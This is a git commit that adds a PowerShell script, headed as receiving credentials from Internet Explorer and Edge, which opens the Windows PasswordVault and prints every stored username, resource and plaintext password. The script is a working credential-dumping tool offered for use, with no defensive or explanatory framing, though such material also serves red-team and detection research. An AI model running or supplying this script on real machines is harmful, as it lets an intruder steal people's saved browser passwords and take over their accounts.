a7f168bc7e3a5a794bc32b3d6b4cdd36a8eefc02
Spectre9889 <55978470+Spectre9889@users.noreply.github.com>
2023-02-06 21:23:34 +0100

    Add files via upload

---
+++ PowerShell.ps1
@@ -0,0 +1,7 @@
+# Content: Receive Credentials from IE & Edge
+# Author: Florian Hansemann | @CyberWarship | https://hansesecure.de
+# Date: 09/2020
+
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+$vault = New-Object Windows.Security.Credentials.PasswordVault
+$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password
